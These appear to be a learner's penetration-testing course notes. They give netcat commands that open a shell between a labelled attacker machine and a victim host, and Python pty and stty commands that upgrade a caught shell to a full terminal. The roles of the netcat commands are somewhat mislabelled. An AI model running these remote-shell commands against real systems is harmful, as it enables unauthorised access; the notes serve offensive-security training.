# Module 16 (File Transfers)

## Generating reverse shell commands <a href="#generating-reverse-shell-commands" id="generating-reverse-shell-commands"></a>

attcker machen

```bash
nc -nvlp 4444 -e /bin/bash
```

victim

```bash
nc -nv 192.168.x.x 4444
```

<figure><img src="../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

## Method 1: Python pty module <a href="#method-1-python-pty-module" id="method-1-python-pty-module"></a>

One of my go-to commands for a long time after catching a dumb shell was to use Python to spawn a pty. The [pty module](https://docs.python.org/2/library/pty.html) let’s you spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal. To upgrade a dumb shell, simply run the following command:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'                                      
```

```bash
stty raw -echo
```

